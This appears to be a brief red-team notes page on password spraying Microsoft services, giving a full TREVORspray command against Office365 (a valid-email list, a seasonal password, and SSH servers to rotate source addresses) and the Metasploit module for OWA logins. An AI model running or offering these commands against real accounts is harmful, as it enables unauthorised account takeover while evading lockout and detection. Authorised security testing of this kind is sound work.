---
description: >-
  A list of tools and resources that I use for password spraying Microsoft
  products.
---

# Spray Microsoft

## Attacking Office365

A tool that I've had a large amount of success with is [TREVORspray](https://github.com/blacklanternsecurity/TREVORspray):\
`./trevorspray.py -e /opt/trevorspray/log/valid_emails.txt -passwords 'Winter2021' --delay 1 --no-current-ip --ssh [SSH SERVERS] -k (KEY)`

## Attacking OWA

Metasploit has a great module for attacking OWA:\
`auxiliary/scanner/http/owa_login`
